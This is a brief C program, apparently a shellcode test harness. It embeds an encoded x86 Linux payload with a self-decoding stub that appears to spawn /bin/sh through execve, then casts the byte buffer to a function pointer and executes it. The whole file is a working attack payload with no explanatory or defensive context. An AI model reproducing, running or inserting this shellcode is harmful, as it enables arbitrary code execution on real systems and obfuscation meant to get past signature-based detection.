#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = 
"\xeb\x1a\x5e\x89\xf7\x31\xc0\xb0\x1a\x01\xc7\x31\xc9\x3a\x0f\x75\x04\x80\x36\x01\x47\x46\x41\x48\x74\x07\xeb\xf1\xe8\xe1\xff\xff\xff\x90\x30\xc1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x30\xc9\x30\xd2\x30\xf6\xb0\x0b\xcd\x81\x01\x02\x10\x12\x14\x19";

int main()
{
    printf("Shellcode Length: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
 
    ret();
}
